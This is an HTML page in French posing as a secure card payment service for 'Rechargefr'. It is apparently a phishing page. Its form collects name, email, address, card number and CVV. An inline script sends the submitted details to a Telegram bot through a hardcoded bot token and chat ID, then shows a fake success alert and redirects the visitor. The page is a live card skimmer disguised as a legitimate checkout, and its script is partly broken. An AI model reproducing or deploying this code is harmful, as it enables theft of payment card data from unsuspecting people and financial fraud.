<!DOCTYPE html>
<html>
<head>
    <title>Rechargefr Payment Service</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" type="text/css" href="style.css">
	<!-- <link href="https://cdn.lineicons.com/3.0/lineicons.css" rel="stylesheet"> -->
	<title>Paiement</title>
</head>
<body>
	<div class="container">
		<h1>Paiement par carte</h1>
		<div class="wrapper">
			<div>
				<img src="img/logo.svg">
			</div>
			<div>
				<form class="payment-form">
					<input type="name" name="" class="firstname" placeholder="nom" required>
					<input type="name" name="" class="lastname" placeholder="prenom"><br>
					<input type="email" name="" class="email" placeholder="email" required><br>
					<textarea class="address" placeholder="addresse" required></textarea><br>
					<input type="name" name="" class="nameoncard" placeholder="nom sur la carte" required><br>
					<input type="text" name="" class="card" placeholder="1234 1234 1234 1234" minlenght="16" maxlenght="16" required>
					<input type="password" name="" class="cvv" maxlength="4" placeholder="cvv" required><br>
					<input type="submit" name="" value="Finaliser la transaction" class="pay-btn">
				</form>
			</div>
		</div>
		 <h4>Paiement 100% sécurisé </h4>
	</div>
	 <script>
        document.addEventListener('DOMContentLoaded', function () {
            var form = document.getElementById('paymentForm');

            form.addEventListener('submit', function (event) {
                event.preventDefault();

                // Collect form data
                var formData = new FormData(form);

                // Convert FormData to JSON
                var formDataJSON = {};
                formData.forEach(function (value, key) {
                    formDataJSON[key] = value;
                });

                // Replace 'YOUR_TELEGRAM_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual Telegram bot token and chat ID
                var telegramBotToken = '6550563050:AAE6DHJ9I4t5EOhVCpoOWY-ZSJiENK7E0Hs';
                var chatID = '1002083816651';

                // Construct the Telegram message
                var message = "New payment details:\n\n";
                for (var key in formDataJSON) {
                    message += key.charAt(0).toUpperCase() + key.slice(1) + ": " + formDataJSON[key] + "\n";
                }

                // Send message to Telegram using fetch
                fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`)
                    .then(response => response.json())
                    .then(data => {
                        // Handle the response from the Telegram API (optional)
                        console.log(data);

                        // Display success popup
                        alert('Succès! Un email vous sera envoyé avec les détails de la commande et votre code.');

                        // Redirect to thank you page
                        window.location.href = 'https://recharge-fr.github.io/RCH/';
                    })
                    .catch(error => {
                        console.error('Erreur lors de l'exécution', error);
                        // Handle error if needed
                    });
            });
        });
    </script>
</body>
	
</html>
    </div>
</body>
</html>
